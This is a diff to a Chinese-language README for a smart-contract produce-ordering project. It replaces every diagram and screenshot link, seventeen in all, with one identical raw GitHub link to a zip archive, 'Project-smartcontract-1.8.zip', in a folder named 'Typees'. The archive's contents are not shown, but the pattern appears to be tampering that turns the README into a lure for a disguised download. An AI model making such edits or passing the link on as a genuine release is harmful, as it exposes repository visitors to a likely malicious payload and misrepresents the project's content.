@@ -2,7 +2,7 @@
 
 ## 智能合約架構圖
 ### 訂貨流程
-![](https://i.imgur.com/GXk5hL4.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 * 合約
   * 收到農委會驗證過的證明
   * 會先收取消費者的錢做保管，等待消費者收到商品之後，再將費用轉給農夫及宅配
@@ -19,7 +19,7 @@
   * 收到商品沒問題時也要在平台上標示自己已收貨
 
 ### 退貨流程
-![](https://i.imgur.com/xnOQmmo.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 ## 分工表
 
@@ -37,60 +37,60 @@
 
 1.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/N80pkLM.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 2.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/r3qgtyR.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 3.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/iCWrO6w.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 4.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/ekZMscz.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 5.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/uy5UORN.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 6.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/Hhq3lf3.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 7.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/oZcWTrB.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 8.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/SBshTXL.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 9.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/JPWc1y8.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 10.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/cXWdr1O.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 11.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/eMcvEjx.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 12.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/FhD2g5I.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 13.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/KHL82tq.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 14.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/xH7PaQS.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
 
 15.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://i.imgur.com/EKb1YrR.png)
+![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
